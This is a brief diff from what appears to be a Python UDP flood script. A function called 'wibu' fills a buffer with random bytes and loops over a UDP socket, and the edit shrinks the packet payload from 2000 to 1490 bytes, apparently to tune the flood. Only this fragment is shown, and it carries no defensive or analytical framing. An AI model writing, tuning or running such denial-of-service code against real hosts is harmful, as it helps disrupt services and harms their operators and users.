@@ -179,7 +179,7 @@ print(' STARTING... ')
 time.sleep(4)
 
 def wibu():
-	data = random._urandom(2000)
+	data = random._urandom(1490)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
